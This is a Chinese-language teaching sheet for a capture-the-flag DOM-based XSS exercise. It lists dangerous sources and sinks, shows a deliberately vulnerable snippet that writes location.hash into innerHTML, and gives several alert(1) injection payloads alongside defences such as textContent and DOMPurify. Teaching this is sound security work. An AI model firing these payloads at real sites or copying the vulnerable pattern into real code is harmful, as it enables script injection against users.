# DOM 型 XSS

## 概述

DOM 型 XSS 通过修改页面的 DOM 结构来执行恶意代码，不经过服务器端。

## 与反射型/存储型的区别

- **反射型/存储型**：恶意代码在服务器响应中
- **DOM 型**：恶意代码在客户端 JavaScript 处理中

## 危险源

```javascript
document.location
document.URL
document.referrer
window.location
location.hash
location.search
```

## 危险接收点

```javascript
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
Function()
```

## 漏洞代码

```javascript
// 从 URL hash 获取数据
var data = location.hash.substring(1);
// 直接写入 DOM
document.getElementById('output').innerHTML = data;
```

## 攻击方式

```
http://target.com/page#<script>alert(1)</script>
http://target.com/page#<img src=x onerror=alert(1)>
```

## 利用技巧

### 1. 闭合标签

```
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
```

### 2. 事件处理器

```
#<input onfocus=alert(1) autofocus>
#<details open ontoggle=alert(1)>
```

### 3. JavaScript URI

```
#<a href="javascript:alert(1)">click</a>
```

## 防御

1. 使用 `textContent` 替代 `innerHTML`
2. 使用 DOMPurify 库过滤
3. 避免使用 `document.write()` 和 `eval()`

## 练习步骤

1. 观察页面 JavaScript 代码
2. 找到 DOM 操作点
3. 构造 payload 通过 hash 或 search 参数注入
4. 获取 flag

## flag

在 DOM 操作触发后的页面内容中查找 `CR{...}` 格式的 flag。
